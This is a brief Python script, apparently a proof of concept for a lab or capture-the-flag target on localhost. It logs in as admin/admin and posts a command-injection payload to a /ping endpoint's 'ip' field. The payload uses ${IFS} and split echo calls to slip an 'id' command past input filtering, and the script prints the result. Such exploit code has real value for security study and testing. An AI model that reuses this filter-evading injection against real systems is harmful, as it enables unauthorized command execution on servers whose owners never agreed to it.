import requests

port = "5109"
url = f"http://localhost:{port}"

payload = "127.0.0.1;$(echo${IFS}i)$(echo${IFS}d)"

s = requests.Session()

r = s.post(url + "/login", {"username": "admin", "password": "admin"})

r = s.post(url + "/ping", {"ip": payload})
print(r.text)